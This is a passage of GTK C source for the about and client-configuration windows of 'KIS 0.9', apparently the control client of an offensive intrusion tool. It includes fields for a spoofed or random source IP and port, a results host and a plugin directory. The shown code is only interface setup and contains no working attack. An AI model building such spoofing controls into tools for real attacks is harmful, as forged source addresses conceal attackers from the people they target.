  gtk_object_set_data (GTK_OBJECT (file_select), "ok_button1", ok_button1);
  gtk_widget_show (ok_button1);
  GTK_WIDGET_SET_FLAGS (ok_button1, GTK_CAN_DEFAULT);

  cancel_button1 = GTK_FILE_SELECTION (file_select)->cancel_button;
  gtk_object_set_data (GTK_OBJECT (file_select), "cancel_button1", cancel_button1);
  gtk_widget_show (cancel_button1);
  GTK_WIDGET_SET_FLAGS (cancel_button1, GTK_CAN_DEFAULT);

  gtk_signal_connect (GTK_OBJECT (ok_button1), "clicked",
                      GTK_SIGNAL_FUNC (on_ok_button1_clicked),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (cancel_button1), "clicked",
                      GTK_SIGNAL_FUNC (on_cancel_button1_clicked),
                      NULL);
  return file_select;
}

GtkWidget*
create_about_window (void)
{
  GtkWidget *about_window;
  GtkWidget *vbox5;
  GtkWidget *about_label;
  GtkWidget *pixmap2;

  about_window = gtk_window_new (GTK_WINDOW_TOPLEVEL);
  gtk_object_set_data (GTK_OBJECT (about_window), "about_window", about_window);
  gtk_window_set_title (GTK_WINDOW (about_window), _("KIS - http://www.uberhax0r.net"));
  gtk_window_set_default_size (GTK_WINDOW (about_window), 270, 175);

  vbox5 = gtk_vbox_new (FALSE, 0);
  gtk_widget_ref (vbox5);
  gtk_object_set_data_full (GTK_OBJECT (about_window), "vbox5", vbox5,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (vbox5);
  gtk_container_add (GTK_CONTAINER (about_window), vbox5);

  about_label = gtk_label_new (_("KIS 0.9 by Optyx <optyx@uberhax0r.net>\nthis code is for educational purposes only\n"));
  gtk_widget_ref (about_label);
  gtk_object_set_data_full (GTK_OBJECT (about_window), "about_label", about_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (about_label);
  gtk_box_pack_start (GTK_BOX (vbox5), about_label, FALSE, FALSE, 0);

  pixmap2 = create_pixmap (about_window, "kis_logo.xpm");
  gtk_widget_ref (pixmap2);
  gtk_object_set_data_full (GTK_OBJECT (about_window), "pixmap2", pixmap2,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (pixmap2);
  gtk_box_pack_start (GTK_BOX (vbox5), pixmap2, TRUE, TRUE, 1);
  return about_window;
}

GtkWidget *spoof_option;
GtkWidget *spoof_box;
GtkWidget *results_box;
GtkWidget *get_results_button;
GtkWidget *plugin_dir_box;

GtkWidget*
create_client_config_window (void)
{
  GtkWidget *client_config_window;
  GtkWidget *vbox6;
  GtkWidget *table2;
  GtkWidget *spoof_source_label;
  GtkWidget *results_label;
  GtkWidget *plugin_dir_label;
  GtkWidget *hbox4;
  GtkWidget *save_client_button;
  GtkWidget *ok_client_button;
  GtkWidget *cancel_client_button;
  GtkTooltips *tooltips;
  char tmp[32];
  struct in_addr addr;

  tooltips = gtk_tooltips_new ();

  client_config_window = gtk_window_new (GTK_WINDOW_TOPLEVEL);
  gtk_object_set_data (GTK_OBJECT (client_config_window), "client_config_window", client_config_window);
  gtk_window_set_title (GTK_WINDOW (client_config_window), _("Client Config"));

  vbox6 = gtk_vbox_new (FALSE, 0);
  gtk_widget_ref (vbox6);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "vbox6", vbox6,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (vbox6);
  gtk_container_add (GTK_CONTAINER (client_config_window), vbox6);

  table2 = gtk_table_new (5, 2, FALSE);
  gtk_widget_ref (table2);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "table2", table2,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (table2);
  gtk_box_pack_start (GTK_BOX (vbox6), table2, TRUE, TRUE, 0);
  gtk_table_set_row_spacings (GTK_TABLE (table2), 5);
  gtk_table_set_col_spacings (GTK_TABLE (table2), 5);

  spoof_option = gtk_check_button_new_with_label(_("spoof"));
  gtk_widget_ref (spoof_option);
  gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(spoof_option), spoof);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "spoof_option", spoof_option,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(spoof_option), (spoof)?TRUE:FALSE);
  gtk_widget_show (spoof_option);
  gtk_table_attach (GTK_TABLE (table2), spoof_option, 0, 1, 0, 1,
                    (GtkAttachOptions) (GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);

   spoof_source_label = gtk_label_new (_("spoof source"));
  gtk_widget_ref (spoof_source_label);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "spoof_source_label", spoof_source_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (spoof_source_label);
  gtk_table_attach (GTK_TABLE (table2), spoof_source_label, 0, 1, 1, 2,
                    (GtkAttachOptions) (GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_misc_set_alignment (GTK_MISC (spoof_source_label), 0, 0.5);

  spoof_box = gtk_entry_new ();
  gtk_widget_ref (spoof_box);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "spoof_box", 
		spoof_box,
                            (GtkDestroyNotify) gtk_widget_unref);
  bzero(tmp, sizeof(tmp));
  addr.s_addr = spoofhost;	
  snprintf(tmp, sizeof(tmp), "%s:%d", 
	inet_ntoa(addr), ntohs(spoofport));
  gtk_entry_set_text(GTK_ENTRY(spoof_box), tmp);
  gtk_widget_show (spoof_box);
  gtk_table_attach (GTK_TABLE (table2), spoof_box, 1, 2, 1, 2,
                    (GtkAttachOptions) (GTK_EXPAND | GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_tooltips_set_tip (tooltips, spoof_box, _("format: ip:port (use ip 0 to specify random source ip, use port 0 to specify random port)"), NULL);

  get_results_button = gtk_check_button_new_with_label (_("get results"));
  gtk_widget_ref (get_results_button);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "get_results_button", get_results_button,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(get_results_button), (results)?TRUE:FALSE);
  gtk_widget_show (get_results_button);
  gtk_table_attach (GTK_TABLE (table2), get_results_button, 0, 2, 2, 3,
                    (GtkAttachOptions) (GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);

   results_label = gtk_label_new (_("local ip:port"));
  gtk_widget_ref (results_label);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "results_label", results_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (results_label);
  gtk_table_attach (GTK_TABLE (table2), results_label, 0, 1, 3, 4,
                    (GtkAttachOptions) (GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_misc_set_alignment (GTK_MISC (results_label), 0, 0.5);

  results_box = gtk_entry_new ();
  gtk_widget_ref (results_box);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "results_box", results_box,
                            (GtkDestroyNotify) gtk_widget_unref);
  bzero(tmp, sizeof(tmp));
  addr.s_addr = resultshost;
  snprintf(tmp, sizeof(tmp), "%s:%d", 
	inet_ntoa(addr), ntohs(resultsport));
  gtk_entry_set_text(GTK_ENTRY(results_box), tmp);
  gtk_widget_show (results_box);
  gtk_table_attach (GTK_TABLE (table2), results_box, 1, 2, 3, 4,
                    (GtkAttachOptions) (GTK_EXPAND | GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_tooltips_set_tip (tooltips, results_box, _("format: ip:port (use port 0 to specify random port)"), NULL);

  plugin_dir_label = gtk_label_new (_("plugin dir"));
  gtk_widget_ref (plugin_dir_label);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "plugin_dir_label", plugin_dir_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (plugin_dir_label);
  gtk_table_attach (GTK_TABLE (table2), plugin_dir_label, 0, 1, 4, 5,
                    (GtkAttachOptions) (GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_misc_set_alignment (GTK_MISC (plugin_dir_label), 0, 0.5);

  plugin_dir_box = gtk_entry_new ();
  gtk_widget_ref (plugin_dir_box);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "plugin_dir_box", plugin_dir_box,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_entry_set_text(GTK_ENTRY(plugin_dir_box), (gchar *) plugin_dir);
  gtk_widget_show (plugin_dir_box);
  gtk_table_attach (GTK_TABLE (table2), plugin_dir_box, 1, 2, 4, 5,
                    (GtkAttachOptions) (GTK_EXPAND | GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);

  hbox4 = gtk_hbox_new (FALSE, 0);
  gtk_widget_ref (hbox4);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "hbox4", hbox4,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (hbox4);
  gtk_box_pack_start (GTK_BOX (vbox6), hbox4, TRUE, TRUE, 0);

  save_client_button = gtk_button_new_with_label (_("save"));
  gtk_widget_ref (save_client_button);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "save_client_button", save_client_button,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (save_client_button);
  gtk_box_pack_start (GTK_BOX (hbox4), save_client_button, FALSE, FALSE, 0);

  ok_client_button = gtk_button_new_with_label (_("ok"));
  gtk_widget_ref (ok_client_button);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "ok_client_button", ok_client_button,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (ok_client_button);
  gtk_box_pack_start (GTK_BOX (hbox4), ok_client_button, FALSE, FALSE, 0);

  cancel_client_button = gtk_button_new_with_label (_("cancel"));
  gtk_widget_ref (cancel_client_button);
  gtk_object_set_data_full (GTK_OBJECT (client_config_window), "cancel_client_button", cancel_client_button,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (cancel_client_button);
  gtk_box_pack_start (GTK_BOX (hbox4), cancel_client_button, FALSE, FALSE, 0);

  gtk_signal_connect (GTK_OBJECT (save_client_button), "clicked",
                      GTK_SIGNAL_FUNC (on_save_client_button_clicked),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (ok_client_button), "clicked",
                      GTK_SIGNAL_FUNC (on_ok_client_button_clicked),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (cancel_client_button), "clicked",
                      GTK_SIGNAL_FUNC (on_cancel_client_button_clicked),
                      NULL);

  gtk_object_set_data (GTK_OBJECT (client_config_window), "tooltips", tooltips);
  return client_config_window;
}

